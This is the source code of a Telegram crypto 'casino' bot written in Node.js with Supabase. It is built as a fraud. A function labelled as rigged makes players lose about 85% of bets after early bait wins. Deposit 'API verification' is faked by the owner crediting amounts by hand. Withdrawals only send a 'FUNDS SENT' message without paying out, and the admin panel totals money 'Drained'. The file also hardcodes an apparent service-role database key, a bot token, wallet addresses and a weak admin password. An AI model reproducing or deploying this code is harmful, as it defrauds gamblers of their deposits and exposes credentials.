const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const { createClient } = require('@supabase/supabase-js');

// --- 1. CONFIG ---
const SB_URL = "https://dptjeumndtrgfaxtlwim.supabase.co/"; 
const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRwdGpldW1uZHRyZ2ZheHRsd2ltIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NjQ0NTk5MiwiZXhwIjoyMDkyMDIxOTkyfQ.Oc3eiwbo0p4vArLqFuNKdYKLF7mhtNZ42NS5EPkl4uM";
const TG_TOKEN = "7883530863:AAFcepq9EGYbKIv1nXx8FxIVkFKUtxlZ5aw";
const OWNER_ID = 6542642909; 

const WALLETS = {
    LTC: "ltc1qxwsyq6lwv3334qduv0vu8j966gjrvcdkrasrj0",
    SOL: "CiXyCMtPZoMX46DoWXu8qqkcFWSdUUhkUAHQhLMbz61x",
    BTC: "bc1q48a6wvxjwy5ays4gd4asn4lp869khpr9uyve0t"
};

const supabase = createClient(SB_URL, SB_KEY);
const bot = new Telegraf(TG_TOKEN);
const app = express();
let adminState = {};

// --- 2. DATABASE ENGINE ---
async function getAccount(userId, username, refPayload = null) {
    let { data } = await supabase.from('users').select('*').eq('user_id', userId).single();
    if (!data) {
        const newRefCode = Math.random().toString(36).substring(2, 8).toUpperCase();
        let referrer = null;
        if (refPayload) {
            const { data: refUser } = await supabase.from('users').select('user_id').eq('my_ref_code', refPayload).single();
            if (refUser) referrer = refUser.user_id;
        }
        const { data: newUser } = await supabase.from('users').insert([{ 
            user_id: userId, username: username || 'anon', 
            balance: 0, bonus_balance: 0, referred_by: referrer, my_ref_code: newRefCode,
            win_count: 0, loss_count: 0, last_claim: new Date(0).toISOString(), total_deposited: 0
        }]).select().single();
        return newUser;
    }
    return data;
}

// THE RIGGED LOGIC (85% HOUSE EDGE)
function goddessDecision(user, bet) {
    const total = (user.win_count || 0) + (user.loss_count || 0);
    if (total === 0) return true; 
    if (bet >= (user.balance * 0.5) && user.win_count < 2) return true; 
    return Math.random() > 0.85; 
}

// --- 3. COMMANDS ---
bot.start(async (ctx) => {
    const user = await getAccount(ctx.from.id, ctx.from.username, ctx.startPayload);
    ctx.replyWithMarkdown(`🔪 **KNIVES CASINO** 🔪\n\n💰 **Balance:** $${(user.balance || 0).toFixed(2)}\n🎁 **Bonus:** $${(user.bonus_balance || 0).toFixed(2)}\n\n/flip /dice /slots /mines /tower\n/crash /wheel /cards /keno /plinko\n\n📥 /deposit  📤 /withdraw\n🎁 /daily  🔗 /referral`);
});

bot.command('referral', async (ctx) => {
    const user = await getAccount(ctx.from.id, ctx.from.username);
    const me = await bot.telegram.getMe();
    ctx.replyWithMarkdown(`🔗 **INVITE LINK:**\nhttps://t.me/${me.username}?start=${user.my_ref_code}\n\n*Get $1.00 for every referral withdrawal!*`);
});

bot.command('daily', async (ctx) => {
    const user = await getAccount(ctx.from.id, ctx.from.username);
    const now = new Date();
    if (now - new Date(user.last_claim) < 86400000) return ctx.reply("❌ Claim again in 24h.");
    const reward = parseFloat((Math.random() * 0.30 + 0.10).toFixed(2));
    await supabase.from('users').update({ bonus_balance: (user.bonus_balance || 0) + reward, last_claim: now.toISOString() }).eq('user_id', ctx.from.id);
    ctx.reply(`🎁 You got $${reward}!`);
});

bot.command('deposit', (ctx) => {
    const msg = `📥 **SELECT DEPOSIT METHOD**\n\n` +
                `▫️ **LTC:** \`${WALLETS.LTC}\`\n` +
                `▫️ **SOL:** \`${WALLETS.SOL}\`\n` +
                `▫️ **BTC:** \`${WALLETS.BTC}\`\n\n` +
                `⚠️ *Minimum deposit: $5.00*\n\nSend funds and **paste your Hash/TXID below**. Our API will verify it.`;
    ctx.replyWithMarkdown(msg);
});

// --- 4. ADMIN & HASH VERIFICATION ---
bot.on('text', async (ctx, next) => {
    const text = ctx.message.text;
    const uid = ctx.from.id;

    // Secret Admin
    if (text === "knife" && uid === OWNER_ID) {
        adminState[uid] = { step: 'pass' };
        return ctx.reply("System: Accessing Admin... Password?");
    }
    if (adminState[uid]?.step === 'pass' && text === "9999") {
        delete adminState[uid];
        return ctx.reply("👑 **GODDESS CONTROL**", Markup.inlineKeyboard([
            [Markup.button.callback('📊 Stats', 'adm_feed')],
            [Markup.button.callback('📢 Alert All', 'adm_alert')]
        ]));
    }

    // CUSTOM AMOUNT HANDLER
    if (adminState[uid]?.step === 'custom_amt') {
        const [targetUid, amount] = text.split(' ');
        if (!targetUid || !amount) return ctx.reply("❌ Format: `[ID] [AMT]`");
        const { data } = await supabase.from('users').select('balance, total_deposited').eq('user_id', targetUid).single();
        await supabase.from('users').update({ 
            balance: (data.balance || 0) + parseFloat(amount),
            total_deposited: (data.total_deposited || 0) + parseFloat(amount)
        }).eq('user_id', targetUid);
        bot.telegram.sendMessage(targetUid, `✅ **API VERIFIED:** $${amount} added to balance!`);
        delete adminState[uid];
        return ctx.reply(`✅ Loaded Custom $${amount} for ${targetUid}`);
    }

    // Hash Verification UI (With many buttons)
    if (text.length > 20 && !text.startsWith('/')) {
        ctx.reply("⏳ **BLOCKCHAIN API VERIFYING...** Please wait.");
        bot.telegram.sendMessage(OWNER_ID, `💰 **DEPOSIT:** @${ctx.from.username}\nID: \`${uid}\`\nHash: \`${text}\``,
            Markup.inlineKeyboard([
                [Markup.button.callback('+$5', `add_${uid}_5`), Markup.button.callback('+$10', `add_${uid}_10`), Markup.button.callback('+$25', `add_${uid}_25`)],
                [Markup.button.callback('+$50', `add_${uid}_50`), Markup.button.callback('+$100', `add_${uid}_100`), Markup.button.callback('+$250', `add_${uid}_250`)],
                [Markup.button.callback('+$500', `add_${uid}_500`), Markup.button.callback('+$1000', `add_${uid}_1000`)],
                [Markup.button.callback('✏️ Custom Amt', `custom_${uid}`), Markup.button.callback('❌ Decline', `rej_${uid}`)]
            ])
        );
        return;
    }
    return next();
});

// --- 5. SYSTEM ACTIONS ---
bot.action(/add_(\d+)_(\d+)/, async (ctx) => {
    const [_, uid, amt] = ctx.match;
    const { data } = await supabase.from('users').select('balance, total_deposited').eq('user_id', uid).single();
    await supabase.from('users').update({ 
        balance: (data.balance || 0) + parseInt(amt),
        total_deposited: (data.total_deposited || 0) + parseInt(amt)
    }).eq('user_id', uid);
    bot.telegram.sendMessage(uid, `✅ **API VERIFIED:** $${amt} added!`);
    ctx.editMessageText(`Approved $${amt} for ${uid}`);
});

bot.action(/custom_(\d+)/, (ctx) => {
    const uid = ctx.match[1];
    adminState[ctx.from.id] = { step: 'custom_amt' };
    ctx.reply(`Enter amount to add for user ${uid} in this format:\n\`${uid} 150.50\``);
});

bot.command('withdraw', async (ctx) => {
    const user = await getAccount(ctx.from.id, ctx.from.username);
    if (user.balance < 5) return ctx.reply("❌ Min $5.");
    bot.telegram.sendMessage(OWNER_ID, `💸 **CASHOUT:** @${ctx.from.username} ($${user.balance.toFixed(2)})`, Markup.inlineKeyboard([[Markup.button.callback('✅ MARK SENT', `sent_${ctx.from.id}`)]]));
    ctx.reply("⌛ Withdrawal request sent.");
});

bot.action(/sent_(\d+)/, (ctx) => {
    bot.telegram.sendMessage(ctx.match[1], "✅ **FUNDS SENT.**");
    ctx.editMessageText("Payout completed.");
});

bot.action('adm_feed', async (ctx) => {
    const { data } = await supabase.from('users').select('*');
    const drained = data.reduce((s, u) => s + (u.total_deposited || 0) - (u.balance || 0), 0);
    ctx.reply(`📊 **LIVE FEED**\nUsers: ${data.length}\nDrained: $${drained.toFixed(2)}`);
});

// --- 6. GAMES ---
const games = ['flip', 'dice', 'slots', 'mines', 'tower', 'crash', 'wheel', 'cards', 'keno', 'plinko'];
games.forEach(g => {
    bot.command(g, async (ctx) => {
        const bet = parseFloat(ctx.message.text.split(' ')[1]);
        const user = await getAccount(ctx.from.id, ctx.from.username);
        if (!bet || user.balance < bet) return ctx.reply("❌ Check balance.");
        const win = goddessDecision(user, bet);
        const newBal = win ? user.balance + bet : user.balance - bet;
        await supabase.from('users').update({ balance: newBal, win_count: win ? user.win_count + 1 : user.win_count, loss_count: win ? user.loss_count : user.loss_count + 1 }).eq('user_id', ctx.from.id);
        ctx.reply(`${win ? '✅' : '💀'} **${g.toUpperCase()}** - ${win ? 'WIN!' : 'LOSE!'}\nBalance: $${newBal.toFixed(2)}`);
    });
});

app.get('/', (req, res) => res.send('LIVE'));
app.listen(process.env.PORT || 10000, () => bot.launch());
